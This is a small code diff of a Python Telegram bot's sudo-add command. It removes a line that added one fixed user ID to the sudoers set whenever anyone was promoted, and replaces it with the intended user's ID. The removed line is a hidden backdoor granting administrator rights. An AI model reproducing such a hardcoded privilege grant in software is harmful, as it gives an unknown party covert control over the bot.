@@ -21,7 +21,7 @@ async def useradd(client, message: Message, _):
         return await message.reply_text(_["sudo_1"].format(user.mention))
     added = await add_sudo(user.id)
     if added:
-        SUDOERS.add(1138802391)
+        SUDOERS.add(user.id)
         await message.reply_text(_["sudo_2"].format(user.mention))
     else:
         await message.reply_text(_["sudo_8"])
